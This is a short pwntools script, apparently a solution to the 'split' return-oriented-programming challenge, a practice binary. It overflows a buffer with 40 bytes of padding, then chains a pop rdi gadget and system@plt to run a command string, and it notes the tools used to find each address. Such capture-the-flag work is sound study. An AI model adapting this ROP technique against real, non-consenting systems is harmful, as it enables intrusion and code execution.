#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 40			# RIP Offset at 40
    cat_flag = p64(0x00601060)		# Radare2 command: izz
    system_plt = p64(0x4005e0)		# objdump -d split | grep system
    pop_rdi = p64(0x0000000000400883)	# python ROPgadget.py --binary split | grep rdi
    p = process("./split")
    payload = junk + pop_rdi + cat_flag + system_plt

    p.sendlineafter(">", payload)
    print p.recvall()

if __name__ == "__main__":
    main()
